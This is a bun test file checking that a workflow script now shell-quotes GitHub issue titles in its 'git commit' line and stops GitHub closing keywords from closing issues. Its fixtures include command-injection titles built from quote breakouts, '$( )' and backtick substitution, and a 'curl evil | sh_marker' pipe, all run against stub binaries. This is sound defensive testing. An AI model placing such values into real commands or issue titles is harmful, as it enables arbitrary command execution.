/**
 * Covers AC-1, AC-2, AC-3, AC-5 (#696).
 *
 * `workflows/ship.js` composed the COMMIT phase's command as
 *
 *     git commit -m "fix(#${ISSUE}): ${goalData.issueTitle}"
 *
 * with the GitHub issue title interpolated UNQUOTED into a double-quoted
 * shell string, two lines under the prompt's own instruction "Run these in
 * order, exactly as written". `shellQuote` was declared in the same file and
 * applied at six other sites, including the wave commit one function away.
 *
 * Measured before the fix: a title of `x" ; echo … ; : "` composes to a line
 * `bash -n` accepts and which parses as three commands, not one.
 *
 * Two consequences from the one interpolation, and they need different
 * assertions:
 *
 *   - COMMAND EXECUTION. An issue title is writable by anyone who can open an
 *     issue; the only gate is an operator choosing to ship that issue.
 *   - A CLOSING KEYWORD. A title containing `Fixes #N` closes issue N on
 *     merge. This already happened by a different route on 2026-10-19:
 *     `cfc1415d` quoted ``Fixes #644`` as a SAMPLE INPUT inside a backtick
 *     code span and GitHub closed #644 three seconds after the merge.
 *     Backticks are not an escape.
 *
 * WHY THIS FILE EXECUTES RATHER THAN GREPS. A source-text assertion that
 * `shellQuote(` appears on the line cannot tell a correct application from
 * `shellQuote(title) + '"'`, and it is satisfied by the identifier appearing
 * in a comment. So the composition is extracted from ship.js and RUN, with a
 * stub `git` on PATH recording argv — the property is "exactly one command
 * ran, and its message is the title verbatim", which is not expressible as a
 * substring check.
 *
 * ONE DECIDER: `shellQuote` and the subject builder are both lifted out of
 * `workflows/ship.js` itself and evaluated. Re-implementing either here would
 * be two deciders that agree, and a mutation of ship.js's copy would leave
 * this file green (`.claude/rules/checks-must-be-able-to-fail.md`, fourth
 * shape).
 */

import { describe, expect, test, beforeAll } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync, readFileSync, chmodSync, rmSync, existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { structuralCut } from "../lib/source-slice";
import { commitSubject } from "../lib/commit-subject";

const SHIP = join(import.meta.dir, "..", "workflows", "ship.js");
const shipSource = readFileSync(SHIP, "utf8");

/** The two bindings under test, lifted from ship.js and evaluated. */
let shellQuote: (w: unknown) => string;
let shipCommitSubject: (issue: number, title: unknown) => string;
/** ship.js's own COMMIT-phase line, composed with the bindings it names. */
let commitLine: (issue: number, title: unknown) => string;

beforeAll(() => {
  // `structuralCut` refuses rather than returning a short cut or the whole
  // document: an anchor appearing 0 or 2 times throws, and so does an empty
  // region. That is the loud abort a mutant builder needs, so there is no
  // length assertion here — a missing binding cannot reach the cases
  // (`.claude/rules/checks-must-be-able-to-fail.md`, "For a script whose job
  // is to exit non-zero").
  const quoteSrc = structuralCut(shipSource, "function shellQuote(", { balanced: "{" });

  // The whole marked block, not just the function: `shipCommitSubject` closes
  // over `CLOSING_KEYWORD`, which is declared beside it. Cutting the function
  // alone would build a binding that throws `ReferenceError` on first call —
  // red for a reason that has nothing to do with the behaviour under test.
  const subjectSrc = structuralCut(shipSource, "// ──── COMMIT-SUBJECT-START ────", {
    endAnchor: "// ──── COMMIT-SUBJECT-END ────",
  });
  expect(subjectSrc, "the block was cut but carries no builder").toContain(
    "function shipCommitSubject(",
  );

  // `new Function` over this repository's own `workflows/ship.js`, which is
  // the only way to make ship.js the single decider — nothing untrusted is
  // interpolated, and the alternative is re-implementing both bindings here
  // and testing the copy (fourth shape: two deciders that agree).
  const built = new Function(
    `${quoteSrc}\n${subjectSrc}\nreturn { shellQuote, shipCommitSubject }`,
  )() as { shellQuote: typeof shellQuote; shipCommitSubject: typeof shipCommitSubject };

  shellQuote = built.shellQuote;
  shipCommitSubject = built.shipCommitSubject;

  // The COMMIT phase's own line, taken out of the prompt it lives in. Writing
  // `git commit -m ${shellQuote(shipCommitSubject(...))}` here instead would
  // test a composition this file invented: ship.js:6040 could drop the
  // `shellQuote(` tomorrow and every case below would stay green, which is
  // precisely the defect #696 is (#500, "a fixture that reached the assertion
  // without the feature"). `git commit -m` appears four times in ship.js, so
  // the region is cut first and the line found inside it.
  const commitBlock = structuralCut(
    shipSource,
    "Do NOT run tests — the test suite was already validated.",
    { endAnchor: "2. Get branch info:" },
  );
  const found = commitBlock.match(/^\s*git commit -m (.+)$/m);
  if (!found) throw new Error("the COMMIT phase's `git commit -m` line is not in the cut");
  const [, messageExpr] = found;

  // Wrapped back into a template literal so the `${…}` is evaluated by the
  // same rules ship.js evaluates it under, with ship.js's own bindings passed
  // in. Nothing is re-implemented; the only thing this file supplies is the
  // issue number and the title.
  const compose = new Function(
    "shellQuote",
    "shipCommitSubject",
    "ISSUE",
    "goalData",
    `return \`git commit -m ${messageExpr}\``,
  ) as (q: unknown, s: unknown, i: number, g: { issueTitle: unknown }) => string;

  commitLine = (issue, title) =>
    compose(shellQuote, shipCommitSubject, issue, { issueTitle: title });
});

/**
 * Run `git commit -m <quoted>` through a real shell with a stub `git`, and
 * report every invocation's argv.
 *
 * The stub is the whole instrument: a title that breaks out of the quoting
 * produces a SECOND invocation, or an invocation of something else entirely,
 * and either is visible here and invisible to a substring check.
 */
function runCommitLine(line: string): { calls: string[][]; extra: string } {
  const dir = mkdtempSync(join(tmpdir(), "commit-quote-"));
  try {
    const log = join(dir, "argv.log");
    const marker = join(dir, "injected.log");
    const bin = join(dir, "bin");
    execFileSync("mkdir", ["-p", bin]);

    // Records argv, one JSON array per line.
    writeFileSync(
      join(bin, "git"),
      `#!/bin/sh\nprintf '%s\\n' "$(node -e 'console.log(JSON.stringify(process.argv.slice(1)))' "$@")" >> ${JSON.stringify(log)}\n`,
      { mode: 0o755 },
    );
    // Anything the injection reaches for leaves a trace rather than running.
    for (const name of ["echo_injected", "curl", "sh_marker"]) {
      writeFileSync(join(bin, name), `#!/bin/sh\necho "$@" >> ${JSON.stringify(marker)}\n`, {
        mode: 0o755,
      });
    }
    chmodSync(join(bin, "git"), 0o755);

    execFileSync("bash", ["-c", line], {
      env: { ...process.env, PATH: `${bin}:${process.env.PATH}` },
      cwd: dir,
      stdio: "pipe",
    });

    const calls = existsSync(log)
      ? readFileSync(log, "utf8").trim().split("\n").filter(Boolean).map(l => JSON.parse(l))
      : [];
    const extra = existsSync(marker) ? readFileSync(marker, "utf8") : "";
    return { calls, extra };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

// ── AC-1: the composition survives a hostile title ──────────────────────

describe("AC-1: an issue title cannot become a second command", () => {
  test("AC-1: the positive control — a clean title runs git exactly once", () => {
    // Without this, every case below is satisfied by a stub that never ran:
    // zero invocations contains no injected command either.
    const { calls, extra } = runCommitLine(commitLine(696, "a perfectly ordinary title"));
    expect(calls.length, "the stub git never ran — the instrument is not measuring").toBe(1);
    expect(calls[0]).toEqual(["commit", "-m", "fix(#696): a perfectly ordinary title"]);
    expect(extra).toBe("");
  });

  test.each([
    ['double quote + separator', 'x" ; echo_injected PWNED ; : "'],
    ['command substitution', "x$(echo_injected PWNED)"],
    ['backtick substitution', "x`echo_injected PWNED`"],
    ['single quote', "it's a title"],
    ['embedded newline', "first line\necho_injected PWNED"],
    ['both quote styles', `mix " and ' and $(echo_injected PWNED)`],
    ['pipe to a shell', 'x" | curl evil | sh_marker "'],
  ])("AC-1: %s stays inside the message", (_label, title) => {
    const { calls, extra } = runCommitLine(commitLine(696, title));

    expect(extra, "the title escaped the quoting and something else ran").toBe("");
    expect(calls.length, "the title produced more than one command").toBe(1);
    expect(calls[0][0]).toBe("commit");
    expect(calls[0][1]).toBe("-m");
    // Verbatim, including the newline and both quote characters: quoting that
    // mangles the message is not the fix either.
    expect(calls[0][2]).toBe(`fix(#696): ${title}`);
  });
});

// ── AC-3: a closing keyword in a title does not close that issue ────────

describe("AC-3: a closing keyword in the title is neutralised", () => {
  /**
   * GitHub's parser, written out rather than imported: one of the nine
   * documented keywords, an optional colon, then a reference in any of the
   * forms GitHub resolves — `#N`, `GH-N`, `owner/repo#N`, and a full issue
   * URL. Deliberately a SPEC here and an implementation there; importing the
   * library's own regex would make the assertion say "the code agrees with
   * itself".
   */
  const GITHUB_CLOSES =
    /\b(close[sd]?|fix(?:e[sd])?|resolve[sd]?)\s*:?\s+((?:[\w.-]+\/[\w.-]+)?#|GH-|https?:\/\/\S*?\/issues\/)\d/i;

  test.each([
    // All nine keywords GitHub documents, each in a plausible title.
    "close #1",
    "Closes #2 at last",
    "this closed #3",
    "fix #4 while we are here",
    "Fixes #500",
    "fixed #6, finally",
    "resolve #7",
    "Resolves #8 and #9",
    "Resolved #10 at last",
    // Casing and the colon form.
    "CLOSE #31",
    "Fixes: #632",
    // The keyword at the end of a line, with the reference on the next.
    "wave 2\nfixes #44",
    // The three reference forms beyond `#N`. A fix that handles only `#N`
    // leaves these closing issues, which is what the first draft did —
    // found by the automated review of the first commit, not by this file.
    "closes GH-77",
    "fixes hornjason/pai-harness#88",
    "resolves https://github.com/hornjason/pai-harness/issues/99",
  ])("AC-3: %j no longer reads as a reference", (title) => {
    const subject = shipCommitSubject(696, title);
    // Break the adjacency and the link is gone; the keyword and the number
    // both stay readable, which is the point — this is not redaction.
    expect(subject).not.toMatch(GITHUB_CLOSES);
    expect(subject, "the digits were eaten, not the adjacency").toMatch(/\d/);
  });

  test("AC-3: the fixtures really do trip GitHub's parser before the transform", () => {
    // Vacuity control. If the spec regex matched none of them, every case
    // above would pass over a transform that does nothing at all.
    for (const title of [
      "Fixes #500",
      "CLOSE #31",
      "Fixes: #632",
      "wave 2\nfixes #44",
      "closes GH-77",
      "fixes hornjason/pai-harness#88",
      "resolves https://github.com/hornjason/pai-harness/issues/99",
    ]) {
      expect(title, `${title} is not a closing reference — the fixture is inert`)
        .toMatch(GITHUB_CLOSES);
    }
  });

  test("AC-3: the run's OWN reference is untouched — it is the one that should close", () => {
    // `fix(#696):` is the prefix this workflow writes deliberately. Neutralising
    // it would break the link between every ship commit and its issue.
    expect(shipCommitSubject(696, "an ordinary title")).toStartWith("fix(#696): ");
  });

  test("AC-3: a bare issue reference with no keyword is left alone", () => {
    // `#630 Phase 2: …` is a real title in this repo. A bare `#N` does not
    // close anything, so rewriting it would be damage with no benefit.
    const subject = shipCommitSubject(631, "#630 Phase 2: the three credentialed modes");
    expect(subject).toContain("#630 Phase 2");
  });

  test("AC-3: the transform is total over the things GitHub hands back", () => {
    for (const v of [null, undefined, 42, ""]) {
      expect(() => shipCommitSubject(696, v as never)).not.toThrow();
    }
  });
});

// ── AC-6: ship.js's forced copy and the library agree ───────────────────

describe("AC-6: the two positions that compose a commit subject are one decider", () => {
  /**
   * `lib/commit-subject.ts` owns this; `scripts/github-op.ts` imports it;
   * `workflows/ship.js` carries an inline copy because a workflow script
   * cannot import (#69).
   *
   * Two copies that nothing compares is #621 exactly — three files named the
   * project's test command, nothing compared them, and two of them had said
   * different things for long enough that every ship run reported
   * `SHIP_PASSED_SUITE_FAILED`. So the copies are compared, by BEHAVIOUR
   * over inputs rather than by source text: a byte comparison would be
   * defeated by a reformat and satisfied by two regexes that differ in a
   * comment.
   */
  const FIXTURES = [
    "an ordinary title",
    "Fixes #500",
    "Fixes: #632",
    "closes GH-77",
    "fixes hornjason/pai-harness#88",
    "resolves https://github.com/hornjason/pai-harness/issues/99",
    "#630 Phase 2: the three credentialed modes",
    "wave 2\nfixes #44",
    'x" ; echo PWNED ; : "',
    "it's a title",
    "prefix fixtures #5 suffix",
    "",
  ];

  test("AC-6: every fixture composes identically on both sides", () => {
    for (const title of FIXTURES) {
      expect(shipCommitSubject(696, title), `the copies disagree on ${JSON.stringify(title)}`)
        .toBe(commitSubject(696, title));
    }
  });

  test("AC-6: the comparison is not vacuous — the fixtures reach the transform", () => {
    // Both sides returning the input unchanged would agree perfectly. At
    // least one fixture has to be something the transform CHANGES, or this
    // whole describe is two identity functions agreeing.
    const changed = FIXTURES.filter(t => commitSubject(696, t) !== `fix(#696): ${t}`);
    expect(changed.length, "no fixture is altered by the transform").toBeGreaterThan(3);
  });

  /** Every file in this tree that composes a `fix(#N): …` commit subject. */
  const SCANNED = ["scripts/github-op.ts", "lib/commit-subject.ts", "workflows/ship.js"];

  /**
   * The 1-indexed lines composing a subject WITHOUT the neutraliser.
   *
   * Line-based rather than a windowed slice, because both real sites are one
   * line and `test/no-fixed-window-slices.test.ts` holds the population of
   * numeric slices at zero (#664). The two accepted spellings are the owning
   * binding and the inline copy's call to its own regex — not an allowlist of
   * sites, which is the thing that becomes evidence it was reviewed; the
   * parity case above is what makes the second spelling equivalent to the
   * first rather than merely tolerated.
   */
  const handComposed = (src: string): number[] =>
    src
      .split("\n")
      .map((line, i) => ({ line, n: i + 1 }))
      .filter(({ line }) => /`fix\(#\$\{[^}]*\}\): \$\{/.test(line))
      .filter(({ line }) => !/neutraliseClosingKeywords|\.replace\(CLOSING_REFERENCE/.test(line))
      .map(({ n }) => n);

  test("AC-6: no position composes a commit subject by hand", () => {
    // The third position, and the one neither AC-1 nor AC-3 can see:
    // `scripts/github-op.ts --title-from-issue` built `fix(#N): <title>` with
    // a template literal. Keeping the title off a command line stops a SHELL
    // reading it and does nothing about GITHUB reading it — that PR title
    // becomes the squash-merge commit subject, which is the position that
    // closed #644. A behavioural case would need the API, so this is a
    // population scan over the source, which is what it is: the composition
    // must go through the one binding, everywhere.
    const offenders = SCANNED.flatMap(p =>
      handComposed(readFileSync(join(import.meta.dir, "..", p), "utf8")).map(n => `${p}:${n}`),
    );
    expect(offenders, `a hand-composed commit subject in: ${offenders.join(", ")}`).toEqual([]);
  });

  test("AC-6: that scan can see a hand-composed subject", () => {
    // Zero is also what a scan pointed at the wrong thing reports, so both
    // directions are exercised against the same binding: the genuinely
    // pre-#696 line out of github-op.ts, and the two live compositions.
    expect(handComposed("  title = `fix(#${n}): ${issue.title}`;"), "the pre-#696 line")
      .toEqual([1]);
    expect(handComposed("return `fix(#${issue}): ${neutraliseClosingKeywords(title)}`")).toEqual([]);
    expect(
      handComposed("return `fix(#${issue}): ${String(title ?? '').replace(CLOSING_REFERENCE, '$1$2$3 ')}`"),
    ).toEqual([]);
  });

  test("AC-6: the library refuses an issue number it cannot compose a reference from", () => {
    // `fix(#undefined):` is a subject, and it is one nobody can trace back.
    for (const bad of [0, -1, 1.5, NaN, undefined]) {
      expect(() => commitSubject(bad as never, "t")).toThrow(TypeError);
    }
  });
});

// ── AC-2: the population of unquoted interpolations is zero ─────────────

describe("AC-2: no shell command in ship.js interpolates untrusted text unquoted", () => {
  /**
   * Agent- and issue-supplied values, by the name they carry in ship.js.
   *
   * Deliberately NOT an exemption list of allowed sites — this is a list of
   * tainted SOURCES, and the assertion is that none of them reaches a shell
   * command without `shellQuote`. An exemption list naming permitted
   * violations becomes evidence they were reviewed
   * (`.claude/rules/exemption-list-self-reference.md` territory); a source
   * list grows only when a new untrusted input is added, which is the moment
   * someone should look.
   */
  const TAINTED = ["goalData.issueTitle", "goalData.issueGoal", "issueTitle"];

  test("AC-2: every tainted interpolation inside a shell command is quoted", () => {
    const offenders: string[] = [];
    shipSource.split("\n").forEach((line, i) => {
      if (!/\b(git|gh|bun|cd|echo|cat|ssh|curl)\b/.test(line)) return;
      for (const name of TAINTED) {
        if (!line.includes(`\${${name}}`)) continue;
        if (line.includes("shellQuote")) continue;
        offenders.push(`${i + 1}: ${line.trim()}`);
      }
    });
    expect(offenders, `unquoted tainted interpolation into a shell command:\n${offenders.join("\n")}`)
      .toEqual([]);
  });

  test("AC-2: the scan can see an offender — it is not matching nothing", () => {
    // The population is zero after the fix, and zero is what a scan that
    // looks at the wrong thing also reports. So plant one and watch it
    // register, against the same code path.
    const planted = `   git commit -m "fix(#\${ISSUE}): \${goalData.issueTitle}"`;
    const offenders: string[] = [];
    [planted].forEach((line, i) => {
      if (!/\b(git|gh|bun|cd|echo|cat|ssh|curl)\b/.test(line)) return;
      for (const name of TAINTED) {
        if (!line.includes(`\${${name}}`)) continue;
        if (line.includes("shellQuote")) continue;
        offenders.push(`${i + 1}: ${line.trim()}`);
      }
    });
    expect(offenders.length, "the scan cannot see the pre-#696 line").toBe(1);
  });
});

// ── AC-5: the cheapest wrong fix does not satisfy AC-1 ──────────────────

describe("AC-5: stripping quote characters is not the fix", () => {
  test("AC-5: the 5pm repair still executes a backtick and a $( ) title", () => {
    // What an operator sees is a double quote breaking the line, so the cheap
    // repair is to delete double quotes from the title and leave the rest.
    // Named per `.claude/rules/checks-must-be-able-to-fail.md`'s fifth shape.
    const cheapRepair = (title: string) =>
      `git commit -m "fix(#696): ${title.replace(/"/g, "")}"`;

    // It does stop the case that motivated the fix…
    const quoted = runCommitLine(cheapRepair('x" ; echo_injected PWNED ; : "'));
    expect(quoted.extra, "the cheap repair does not even stop the quote case").toBe("");

    // …and leaves these two running, inside the double quotes it kept.
    for (const title of ["x$(echo_injected PWNED)", "x`echo_injected PWNED`"]) {
      const { extra } = runCommitLine(cheapRepair(title));
      expect(
        extra,
        `the cheap repair was expected to leave ${title} executing — if this is empty the counterfactual is wrong, not the fix`,
      ).toContain("PWNED");
    }
  });
});
